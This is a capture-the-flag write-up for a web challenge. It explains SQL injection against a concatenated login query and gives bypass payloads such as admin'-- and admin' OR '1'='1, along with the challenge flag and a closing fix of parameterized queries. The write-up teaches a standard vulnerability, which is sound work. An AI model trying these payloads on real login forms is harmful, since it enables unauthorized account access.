# Bobby Tables — Web, 250 pts

## Objective
Login builds its DB query by gluing input into a string. Log in as **admin** without the password.
(Name = the xkcd "Little Bobby Tables" SQL injection comic.)

```sql
SELECT * FROM users WHERE user='<you>' AND pass='<you>'
```

## Concepts
- Input concatenated straight into SQL → **SQL injection**. Your input becomes query *logic*.
- `'` closes the opened string; `--` starts a SQL comment (rest of line ignored).

## Steps
Type the payload **into the Username field on the page** (not the DevTools console!):
```
Username: admin'--
Password: (blank)
```
Resulting query:
```sql
SELECT * FROM users WHERE user='admin'-- ' AND pass=''
```
- `user='admin'` selects the admin row.
- `--` comments out the password check.

Fallbacks if `--` alone fails:
1. `admin'-- ` (trailing space — needed by MySQL)
2. `admin'#` (`#` = MySQL comment)
3. `admin' OR '1'='1`

> Common mistake I made: pasting the whole `SELECT ...` line into the DevTools **Console**.
> That runs JavaScript, not SQL → `SyntaxError`. You only fill the two input fields.

## Flag
```
CTF{0r_1_equals_1_0pens_d00rs}
```

## Takeaway
**Never build SQL by string concatenation.** Fix = **parameterized queries / prepared statements**.
The attacker's question: *"where does my input land, and can I break out of its context?"* — same
idea drives XSS and command injection.
